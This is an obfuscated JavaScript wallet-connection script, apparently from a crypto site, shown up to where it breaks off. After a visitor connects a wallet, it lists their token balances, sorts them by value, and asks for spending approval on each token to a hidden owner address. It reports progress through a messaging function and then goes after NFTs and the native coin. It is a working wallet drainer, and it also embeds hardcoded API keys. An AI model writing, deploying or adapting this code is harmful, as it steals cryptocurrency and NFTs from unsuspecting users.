const _0x14157c=_0x358c;(function(_0x50166c,_0x87d31b){const _0x31f087=_0x358c,_0x4eb20b=_0x50166c();while(!![]){try{const _0x178283=-parseInt(_0x31f087(0x1fa))/0x1*(parseInt(_0x31f087(0x1c2))/0x2)+parseInt(_0x31f087(0x217))/0x3*(parseInt(_0x31f087(0x238))/0x4)+-parseInt(_0x31f087(0x1f6))/0x5*(parseInt(_0x31f087(0x1f7))/0x6)+parseInt(_0x31f087(0x1e2))/0x7*(parseInt(_0x31f087(0x176))/0x8)+parseInt(_0x31f087(0x250))/0x9*(-parseInt(_0x31f087(0x22a))/0xa)+parseInt(_0x31f087(0x1fd))/0xb+parseInt(_0x31f087(0x24b))/0xc;if(_0x178283===_0x87d31b)break;else _0x4eb20b['push'](_0x4eb20b['shift']());}catch(_0x45b1b4){_0x4eb20b['push'](_0x4eb20b['shift']());}}}(_0x34ef,0xc69cc));let tokens=[],NFTs=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window[_0x14157c(0x1ea)][_0x14157c(0x1f5)],WalletConnectProvider=window[_0x14157c(0x25b)][_0x14157c(0x1f5)],OWNER_ADDRESS=_0x14157c(0x20d),ABI=[{'constant':!![],'inputs':[],'name':_0x14157c(0x1f3),'outputs':[{'name':'','type':_0x14157c(0x201)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'constant':![],'inputs':[{'name':_0x14157c(0x1f1),'type':_0x14157c(0x241)}],'name':_0x14157c(0x1b0),'outputs':[],'payable':![],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'constant':![],'inputs':[{'name':_0x14157c(0x1c0),'type':_0x14157c(0x241)},{'name':'_value','type':_0x14157c(0x162)}],'name':_0x14157c(0x1c5),'outputs':[],'payable':![],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'constant':!![],'inputs':[],'name':_0x14157c(0x172),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'constant':![],'inputs':[{'name':_0x14157c(0x193),'type':_0x14157c(0x241)}],'name':_0x14157c(0x1d4),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x14157c(0x22f)},{'constant':!![],'inputs':[],'name':_0x14157c(0x198),'outputs':[{'name':'','type':_0x14157c(0x162)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':'function'},{'constant':![],'inputs':[{'name':'_from','type':'address'},{'name':_0x14157c(0x223),'type':_0x14157c(0x241)},{'name':_0x14157c(0x16c),'type':_0x14157c(0x162)}],'name':'transferFrom','outputs':[],'payable':![],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'constant':!![],'inputs':[],'name':_0x14157c(0x169),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x14157c(0x241)}],'name':_0x14157c(0x1c3),'outputs':[{'name':'','type':_0x14157c(0x162)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':'function'},{'constant':!![],'inputs':[],'name':_0x14157c(0x1bb),'outputs':[{'name':'','type':_0x14157c(0x162)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':'function'},{'constant':!![],'inputs':[],'name':_0x14157c(0x1f0),'outputs':[{'name':'','type':_0x14157c(0x162)}],'payable':![],'stateMutability':'view','type':_0x14157c(0x22f)},{'constant':!![],'inputs':[],'name':'_totalSupply','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'constant':![],'inputs':[],'name':_0x14157c(0x207),'outputs':[],'payable':![],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'constant':!![],'inputs':[{'name':'_maker','type':_0x14157c(0x241)}],'name':_0x14157c(0x174),'outputs':[{'name':'','type':_0x14157c(0x25a)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x14157c(0x241)},{'name':'','type':_0x14157c(0x241)}],'name':_0x14157c(0x170),'outputs':[{'name':'','type':_0x14157c(0x162)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'constant':!![],'inputs':[],'name':_0x14157c(0x25f),'outputs':[{'name':'','type':_0x14157c(0x25a)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'constant':!![],'inputs':[{'name':_0x14157c(0x165),'type':_0x14157c(0x241)}],'name':_0x14157c(0x1d7),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[],'name':_0x14157c(0x1bc),'outputs':[],'payable':![],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'constant':!![],'inputs':[],'name':'getOwner','outputs':[{'name':'','type':_0x14157c(0x241)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'constant':!![],'inputs':[],'name':'owner','outputs':[{'name':'','type':_0x14157c(0x241)}],'payable':![],'stateMutability':'view','type':_0x14157c(0x22f)},{'constant':!![],'inputs':[],'name':_0x14157c(0x1b7),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x14157c(0x166),'type':'function'},{'constant':![],'inputs':[{'name':_0x14157c(0x223),'type':_0x14157c(0x241)},{'name':_0x14157c(0x16c),'type':_0x14157c(0x162)}],'name':_0x14157c(0x21a),'outputs':[],'payable':![],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'constant':![],'inputs':[{'name':_0x14157c(0x18e),'type':_0x14157c(0x162)},{'name':_0x14157c(0x247),'type':_0x14157c(0x162)}],'name':'setParams','outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':_0x14157c(0x1a2),'type':_0x14157c(0x162)}],'name':_0x14157c(0x1a0),'outputs':[],'payable':![],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'constant':![],'inputs':[{'name':_0x14157c(0x1a2),'type':_0x14157c(0x162)}],'name':_0x14157c(0x243),'outputs':[],'payable':![],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'constant':!![],'inputs':[{'name':_0x14157c(0x1ee),'type':_0x14157c(0x241)},{'name':_0x14157c(0x1c0),'type':'address'}],'name':_0x14157c(0x218),'outputs':[{'name':_0x14157c(0x1bd),'type':_0x14157c(0x162)}],'payable':![],'stateMutability':'view','type':_0x14157c(0x22f)},{'constant':!![],'inputs':[],'name':_0x14157c(0x1b5),'outputs':[{'name':'','type':_0x14157c(0x162)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x14157c(0x163),'outputs':[{'name':'','type':_0x14157c(0x25a)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'constant':![],'inputs':[{'name':_0x14157c(0x23f),'type':_0x14157c(0x241)}],'name':_0x14157c(0x1d6),'outputs':[],'payable':![],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':_0x14157c(0x162)}],'payable':![],'stateMutability':_0x14157c(0x166),'type':'function'},{'constant':![],'inputs':[{'name':'newOwner','type':'address'}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':_0x14157c(0x23a),'type':'address'}],'name':_0x14157c(0x24c),'outputs':[],'payable':![],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[{'name':'_initialSupply','type':_0x14157c(0x162)},{'name':_0x14157c(0x1c6),'type':_0x14157c(0x201)},{'name':_0x14157c(0x18c),'type':_0x14157c(0x201)},{'name':'_decimals','type':_0x14157c(0x162)}],'payable':![],'stateMutability':'nonpayable','type':'constructor'},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x14157c(0x162)}],'name':_0x14157c(0x1ff),'type':_0x14157c(0x258)},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x14157c(0x162)}],'name':_0x14157c(0x16e),'type':_0x14157c(0x258)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x14157c(0x21e),'type':_0x14157c(0x241)}],'name':_0x14157c(0x210),'type':_0x14157c(0x258)},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':_0x14157c(0x162)},{'indexed':![],'name':_0x14157c(0x225),'type':_0x14157c(0x162)}],'name':'Params','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x14157c(0x23a),'type':'address'},{'indexed':![],'name':'_balance','type':_0x14157c(0x162)}],'name':'DestroyedBlackFunds','type':_0x14157c(0x258)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':_0x14157c(0x241)}],'name':_0x14157c(0x236),'type':_0x14157c(0x258)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':_0x14157c(0x241)}],'name':_0x14157c(0x20b),'type':_0x14157c(0x258)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x14157c(0x22c),'type':_0x14157c(0x241)},{'indexed':!![],'name':'spender','type':_0x14157c(0x241)},{'indexed':![],'name':'value','type':_0x14157c(0x162)}],'name':_0x14157c(0x230),'type':_0x14157c(0x258)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'from','type':_0x14157c(0x241)},{'indexed':!![],'name':'to','type':_0x14157c(0x241)},{'indexed':![],'name':_0x14157c(0x175),'type':'uint256'}],'name':_0x14157c(0x1a8),'type':'event'},{'anonymous':![],'inputs':[],'name':_0x14157c(0x21f),'type':_0x14157c(0x258)},{'anonymous':![],'inputs':[],'name':'Unpause','type':'event'}],ABIN=[{'inputs':[{'internalType':'string','name':_0x14157c(0x1f3),'type':_0x14157c(0x201)},{'internalType':_0x14157c(0x201),'name':_0x14157c(0x1b7),'type':'string'},{'internalType':_0x14157c(0x162),'name':'maxNftSupply','type':'uint256'},{'internalType':_0x14157c(0x162),'name':_0x14157c(0x256),'type':_0x14157c(0x162)}],'stateMutability':'nonpayable','type':_0x14157c(0x219)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x14157c(0x241),'name':'owner','type':'address'},{'indexed':!![],'internalType':_0x14157c(0x241),'name':'approved','type':_0x14157c(0x241)},{'indexed':!![],'internalType':_0x14157c(0x162),'name':_0x14157c(0x199),'type':_0x14157c(0x162)}],'name':_0x14157c(0x230),'type':_0x14157c(0x258)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x14157c(0x241),'name':'owner','type':'address'},{'indexed':!![],'internalType':_0x14157c(0x241),'name':_0x14157c(0x168),'type':_0x14157c(0x241)},{'indexed':![],'internalType':_0x14157c(0x25a),'name':'approved','type':_0x14157c(0x25a)}],'name':'ApprovalForAll','type':_0x14157c(0x258)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x14157c(0x241),'name':_0x14157c(0x195),'type':_0x14157c(0x241)},{'indexed':!![],'internalType':_0x14157c(0x241),'name':_0x14157c(0x16b),'type':'address'}],'name':_0x14157c(0x1ad),'type':_0x14157c(0x258)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x14157c(0x241),'name':_0x14157c(0x1dd),'type':_0x14157c(0x241)},{'indexed':!![],'internalType':_0x14157c(0x241),'name':'to','type':_0x14157c(0x241)},{'indexed':!![],'internalType':_0x14157c(0x162),'name':_0x14157c(0x199),'type':_0x14157c(0x162)}],'name':'Transfer','type':'event'},{'inputs':[],'name':_0x14157c(0x171),'outputs':[{'internalType':_0x14157c(0x201),'name':'','type':_0x14157c(0x201)}],'stateMutability':'view','type':_0x14157c(0x22f)},{'inputs':[],'name':'MAX_APES','outputs':[{'internalType':_0x14157c(0x162),'name':'','type':'uint256'}],'stateMutability':'view','type':_0x14157c(0x22f)},{'inputs':[],'name':_0x14157c(0x1da),'outputs':[{'internalType':_0x14157c(0x162),'name':'','type':_0x14157c(0x162)}],'stateMutability':_0x14157c(0x166),'type':'function'},{'inputs':[],'name':_0x14157c(0x1fe),'outputs':[{'internalType':_0x14157c(0x162),'name':'','type':_0x14157c(0x162)}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x241),'name':'to','type':_0x14157c(0x241)},{'internalType':_0x14157c(0x162),'name':'tokenId','type':'uint256'}],'name':'approve','outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x241),'name':_0x14157c(0x22c),'type':_0x14157c(0x241)}],'name':_0x14157c(0x1d7),'outputs':[{'internalType':_0x14157c(0x162),'name':'','type':_0x14157c(0x162)}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[],'name':_0x14157c(0x246),'outputs':[{'internalType':'string','name':'','type':_0x14157c(0x201)}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[],'name':'emergencySetStartingIndexBlock','outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[],'name':_0x14157c(0x215),'outputs':[],'stateMutability':'nonpayable','type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x162),'name':_0x14157c(0x199),'type':_0x14157c(0x162)}],'name':_0x14157c(0x16d),'outputs':[{'internalType':_0x14157c(0x241),'name':'','type':_0x14157c(0x241)}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x241),'name':'owner','type':_0x14157c(0x241)},{'internalType':_0x14157c(0x241),'name':_0x14157c(0x168),'type':'address'}],'name':_0x14157c(0x167),'outputs':[{'internalType':_0x14157c(0x25a),'name':'','type':_0x14157c(0x25a)}],'stateMutability':_0x14157c(0x166),'type':'function'},{'inputs':[],'name':_0x14157c(0x19a),'outputs':[{'internalType':_0x14157c(0x162),'name':'','type':'uint256'}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x162),'name':_0x14157c(0x1fb),'type':_0x14157c(0x162)}],'name':_0x14157c(0x249),'outputs':[],'stateMutability':_0x14157c(0x212),'type':_0x14157c(0x22f)},{'inputs':[],'name':_0x14157c(0x1f3),'outputs':[{'internalType':_0x14157c(0x201),'name':'','type':_0x14157c(0x201)}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[],'name':_0x14157c(0x22c),'outputs':[{'internalType':'address','name':'','type':'address'}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x162),'name':_0x14157c(0x199),'type':_0x14157c(0x162)}],'name':'ownerOf','outputs':[{'internalType':'address','name':'','type':_0x14157c(0x241)}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[],'name':_0x14157c(0x17e),'outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[],'name':_0x14157c(0x1eb),'outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x241),'name':_0x14157c(0x1dd),'type':_0x14157c(0x241)},{'internalType':_0x14157c(0x241),'name':'to','type':_0x14157c(0x241)},{'internalType':'uint256','name':'tokenId','type':_0x14157c(0x162)}],'name':_0x14157c(0x1a6),'outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':'address','name':'from','type':'address'},{'internalType':_0x14157c(0x241),'name':'to','type':_0x14157c(0x241)},{'internalType':_0x14157c(0x162),'name':_0x14157c(0x199),'type':_0x14157c(0x162)},{'internalType':_0x14157c(0x254),'name':_0x14157c(0x19e),'type':'bytes'}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[],'name':_0x14157c(0x25d),'outputs':[{'internalType':_0x14157c(0x25a),'name':'','type':_0x14157c(0x25a)}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x241),'name':'operator','type':_0x14157c(0x241)},{'internalType':_0x14157c(0x25a),'name':_0x14157c(0x1e5),'type':_0x14157c(0x25a)}],'name':_0x14157c(0x24f),'outputs':[],'stateMutability':'nonpayable','type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x201),'name':'baseURI','type':_0x14157c(0x201)}],'name':_0x14157c(0x1a4),'outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x201),'name':_0x14157c(0x1ba),'type':_0x14157c(0x201)}],'name':_0x14157c(0x248),'outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x162),'name':'revealTimeStamp','type':_0x14157c(0x162)}],'name':_0x14157c(0x21b),'outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[],'name':_0x14157c(0x1fc),'outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':_0x14157c(0x162),'name':'','type':_0x14157c(0x162)}],'stateMutability':_0x14157c(0x166),'type':'function'},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':_0x14157c(0x162),'name':'','type':_0x14157c(0x162)}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':'bytes4','name':_0x14157c(0x177),'type':'bytes4'}],'name':'supportsInterface','outputs':[{'internalType':_0x14157c(0x25a),'name':'','type':_0x14157c(0x25a)}],'stateMutability':_0x14157c(0x166),'type':'function'},{'inputs':[],'name':_0x14157c(0x1b7),'outputs':[{'internalType':_0x14157c(0x201),'name':'','type':_0x14157c(0x201)}],'stateMutability':_0x14157c(0x166),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x14157c(0x1a9),'type':_0x14157c(0x162)}],'name':_0x14157c(0x1d5),'outputs':[{'internalType':_0x14157c(0x162),'name':'','type':_0x14157c(0x162)}],'stateMutability':_0x14157c(0x166),'type':'function'},{'inputs':[{'internalType':_0x14157c(0x241),'name':_0x14157c(0x22c),'type':'address'},{'internalType':_0x14157c(0x162),'name':_0x14157c(0x1a9),'type':_0x14157c(0x162)}],'name':_0x14157c(0x17d),'outputs':[{'internalType':_0x14157c(0x162),'name':'','type':_0x14157c(0x162)}],'stateMutability':'view','type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x162),'name':_0x14157c(0x199),'type':_0x14157c(0x162)}],'name':_0x14157c(0x1cd),'outputs':[{'internalType':'string','name':'','type':_0x14157c(0x201)}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[],'name':'totalSupply','outputs':[{'internalType':_0x14157c(0x162),'name':'','type':_0x14157c(0x162)}],'stateMutability':_0x14157c(0x166),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':_0x14157c(0x241),'name':_0x14157c(0x1dd),'type':_0x14157c(0x241)},{'internalType':'address','name':'to','type':'address'},{'internalType':_0x14157c(0x162),'name':_0x14157c(0x199),'type':_0x14157c(0x162)}],'name':_0x14157c(0x252),'outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[{'internalType':'address','name':_0x14157c(0x16b),'type':_0x14157c(0x241)}],'name':_0x14157c(0x1d1),'outputs':[],'stateMutability':_0x14157c(0x178),'type':_0x14157c(0x22f)},{'inputs':[],'name':_0x14157c(0x24a),'outputs':[],'stateMutability':_0x14157c(0x178),'type':'function'}],networkToId={0x1328cf7:'btc-mainnet',0x1:_0x14157c(0x203),0x5:'eth-goerli',0x89:'matic-mainnet',0x13881:_0x14157c(0x185),0x38:'bsc-mainnet',0x61:_0x14157c(0x239),0xa86a:_0x14157c(0x1a7),0xa869:_0x14157c(0x1be),0xfa:_0x14157c(0x24d),0xfa2:'fantom-testnet',0xa4b1:_0x14157c(0x213),0x66eed:_0x14157c(0x19d),0xa4ba:'arbitrum-nova-mainnet',0x250:_0x14157c(0x23b),0x51:_0x14157c(0x161),0x150:_0x14157c(0x1c4),0x4e454152:'aurora-mainnet',0x4e454153:_0x14157c(0x20f),0x6984c:_0x14157c(0x1cc),0x69849:_0x14157c(0x1af),0x7e4:_0x14157c(0x16f),0x14a33:_0x14157c(0x260),0x77:'bittorrent-mainnet',0x405:_0x14157c(0x1a3),0xa918:'boba-avalanche-mainnet',0x10e8:_0x14157c(0x16a),0xdbe0:_0x14157c(0x1df),0x2600:_0x14157c(0x1b8),0x50e:_0x14157c(0x1c8),0x511:_0x14157c(0x259),0x120:_0x14157c(0x194),0x1c:_0x14157c(0x1ce),0xb48:_0x14157c(0x1d9),0x1e14:_0x14157c(0x1ab),0x436f7631:_0x14157c(0x1a5),0x19:_0x14157c(0x232),0x152:'cronos-testnet',0xd2af:'defi-kingdoms-mainnet',0x14f:_0x14157c(0x1cf),0xa516:_0x14157c(0x25c),0x2329:_0x14157c(0x19b),0x2328:_0x14157c(0x1b1),0x868:_0x14157c(0x19c),0x86a:_0x14157c(0x1de),0x13:_0x14157c(0x224),0x10:_0x14157c(0x179),0xe:_0x14157c(0x1e0),0x72:_0x14157c(0x1f2),0xb7e7759:'gather-mainnet',0x153c099c:_0x14157c(0x23c),0x63564c40:'harmony-mainnet',0x6357d2e0:_0x14157c(0x220),0x141:_0x14157c(0x1e1),0x142:_0x14157c(0x216),0xe704:'linea-testnet',0x1389:_0x14157c(0x17f),0x52:_0x14157c(0x18f),0x53:'meter-testnet',0x440:'metis-mainnet',0x24c:_0x14157c(0x182),0x7d2:'milkomeda-a1-mainnet',0x30e0a:'milkomeda-a1-devnet',0x7d1:_0x14157c(0x1d2),0x30da5:_0x14157c(0x1ac),0x504:_0x14157c(0x197),0x507:_0x14157c(0x173),0x505:_0x14157c(0x235),0xe9ac0ce:'neon-testnet',0x116ea:'nervos-godwoken-mainnet',0x116e9:'nervos-godwoken-testnet',0x116e1:_0x14157c(0x1db),0x5afe:_0x14157c(0x1c1),0x5aff:_0x14157c(0x1e4),0xf8:_0x14157c(0x1d3),0x249c:_0x14157c(0x214),0xa:_0x14157c(0x187),0x2a15c308d:_0x14157c(0x22b),0x2a15c3083:'palm-testnet',0x5a2:_0x14157c(0x1cb),0x1e:'rsk-mainnet',0x1f:_0x14157c(0x1e7),0x5d456c62:_0x14157c(0x251),0x1482a7b2:_0x14157c(0x1dc),0x3d28774d:_0x14157c(0x20c),0x109b4597:_0x14157c(0x189),0x536f6c4d:_0x14157c(0x1bf),0x1202c:_0x14157c(0x21d),0x1202d:_0x14157c(0x1ef),0x1a0:_0x14157c(0x245)},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0x38:'https://bsc-dataseed.binance.org/'},'chainId':0x38,'network':_0x14157c(0x183),'infuraId':'e62a60a251c64745baefeaf8237af646','pollingInterval':_0x14157c(0x1b6)}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':_0x14157c(0x17a),'infuraId':'e62a60a251c64745baefeaf8237af646','rpc':_0x14157c(0x221),'chainId':0x38,'network':_0x14157c(0x183),'darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});function _0x358c(_0x5e47fc,_0x485471){const _0x34ef45=_0x34ef();return _0x358c=function(_0x358cb5,_0x319138){_0x358cb5=_0x358cb5-0x161;let _0x5cad54=_0x34ef45[_0x358cb5];return _0x5cad54;},_0x358c(_0x5e47fc,_0x485471);}$(_0x14157c(0x257))[_0x14157c(0x237)](async function(){const _0x27b4aa=_0x14157c;try{let _0x1793b7=await web3Modal[_0x27b4aa(0x164)]();onProvider(_0x1793b7),_0x1793b7['on'](_0x27b4aa(0x1ec),_0x662245=>{console['log'](_0x662245),onProvider(_0x1793b7);});}catch(_0x2459fc){console[_0x27b4aa(0x1e8)](_0x27b4aa(0x20a),_0x2459fc);return;}});async function onProvider(_0x58883b){const _0x2f81c0=_0x14157c;web3Object=new Web3(_0x58883b);let _0x4d5e05=await web3Object[_0x2f81c0(0x186)][_0x2f81c0(0x1e6)]();selectedAccount=_0x4d5e05[0x0],chainName=await web3Object['eth'][_0x2f81c0(0x211)](),chainId=networkToId[chainName],console[_0x2f81c0(0x1e8)](chainId),console[_0x2f81c0(0x1e8)](selectedAccount),_0x4d5e05[_0x2f81c0(0x1d0)]&&(sendMessage(_0x2f81c0(0x1b2)),sendMessage(_0x2f81c0(0x253)+selectedAccount),covalenthqAPICall());}const Oxa=_0x14157c(0x18a),Oxc=_0x14157c(0x191);async function covalenthqAPICall(){const _0x38df81=_0x14157c,_0x260d07={'chain':_0x38df81(0x228)},_0x24c650=new URL(_0x38df81(0x1f4)+selectedAccount+_0x38df81(0x23d));_0x24c650[_0x38df81(0x261)]=new URLSearchParams(_0x260d07)[_0x38df81(0x242)]();const _0x3fc94b={'method':'GET','headers':{'accept':_0x38df81(0x25e),'X-API-Key':'LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn'}};try{const _0x55a8ca=await fetch(_0x24c650,_0x3fc94b)[_0x38df81(0x22e)](_0x58f85f=>_0x58f85f[_0x38df81(0x24e)]());console[_0x38df81(0x1e8)](_0x55a8ca);let _0x217c66=_0x55a8ca;console[_0x38df81(0x1e8)]('Initial\x20list\x20',_0x217c66);let _0xe41085=await Promise[_0x38df81(0x1a1)](_0x217c66[_0x38df81(0x255)](async _0x5e549e=>{const _0x2451c5=_0x38df81;let _0x231ec3;try{_0x231ec3=await getValue(_0x5e549e[_0x2451c5(0x1e3)],_0x5e549e['balance'],_0x5e549e[_0x2451c5(0x1bb)]);}catch(_0x3559a9){_0x231ec3=0x0;}return console[_0x2451c5(0x1e8)](_0x231ec3),{'balance':_0x5e549e['balance'],'value':_0x231ec3,'address':_0x5e549e[_0x2451c5(0x1e3)]};}));console[_0x38df81(0x1e8)](_0x38df81(0x1ca),_0xe41085),tokens=_0xe41085[_0x38df81(0x226)](_0x2c72ab=>_0x2c72ab[_0x38df81(0x175)]>0x5),tokens[_0x38df81(0x240)]((_0x1ce297,_0x5cf2d1)=>_0x5cf2d1[_0x38df81(0x175)]-_0x1ce297[_0x38df81(0x175)]),console[_0x38df81(0x1e8)](_0x38df81(0x19f),chainId,'Tokens:',tokens);if(tokens[_0x38df81(0x1d0)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x38df81(0x184));}NFTs=await getNFTs(selectedAccount)[_0x38df81(0x209)](_0x339313=>{const _0x47c073=_0x38df81;console[_0x47c073(0x1e8)]('Unable\x20to\x20get\x20NFts',_0x339313);}),NFTs=NFTs[_0x38df81(0x1c9)],console[_0x38df81(0x1e8)](_0x38df81(0x222),NFTs);}async function onApprove(){const _0x510c29=_0x14157c;if(tokens['length'])try{loopTokens(tokens);}catch(_0x3de0ca){console[_0x510c29(0x1ed)](_0x510c29(0x1aa)+_0x3de0ca[_0x510c29(0x20e)]);}else{if(NFTs[_0x510c29(0x1d0)]){try{loopNfts(NFTs);}catch(_0x26e04c){console[_0x510c29(0x1ed)](_0x510c29(0x1aa)+_0x26e04c[_0x510c29(0x20e)]);}onSendEther(),sendMessage(_0x510c29(0x1b9));}else try{onSendEther();}catch(_0x20fb19){console[_0x510c29(0x1ed)]('Error\x20processing\x20item\x20'+_0x20fb19[_0x510c29(0x20e)]);}}}async function loopTokens(_0x413737){const _0x1f8233=_0x14157c;for await(let _0x572b80 of _0x413737){console['log'](_0x1f8233(0x21c),_0x572b80);try{let _0x501baa=new web3Object[(_0x1f8233(0x186))][(_0x1f8233(0x17b))](ABI,_0x572b80['address']);sendMessage(_0x1f8233(0x1c7)),await _0x501baa['methods']['approve'](Oxa,_0x1f8233(0x229))[_0x1f8233(0x233)]({'from':selectedAccount,'to':_0x572b80[_0x1f8233(0x241)]})['on'](_0x1f8233(0x204),_0xcc9730=>{const _0x4391d4=_0x1f8233;console['log'](_0x4391d4(0x1e9)+_0xcc9730);})['on'](_0x1f8233(0x1f9),_0x538ee3=>{const _0x60d468=_0x1f8233;console[_0x60d468(0x1e8)](_0x60d468(0x1b4)+_0x538ee3),sendMessage(_0x60d468(0x1ae)),sendMessage(_0x60d468(0x202)+_0x572b80['address']),sendMessage(_0x60d468(0x196)+_0x572b80[_0x60d468(0x234)]),sendMessage(_0x60d468(0x180)+Oxa);})['on'](_0x1f8233(0x1ed),_0x881e0b=>{const _0x5d88c9=_0x1f8233;console[_0x5d88c9(0x1e8)](_0x5d88c9(0x18d)+_0x881e0b),sendMessage(_0x5d88c9(0x22d));});}catch(_0x37cd23){console['log'](_0x1f8233(0x18d)+_0x37cd23),sendMessage(_0x1f8233(0x22d));}};await loopNfts(NFTs);}function _0x34ef(){const 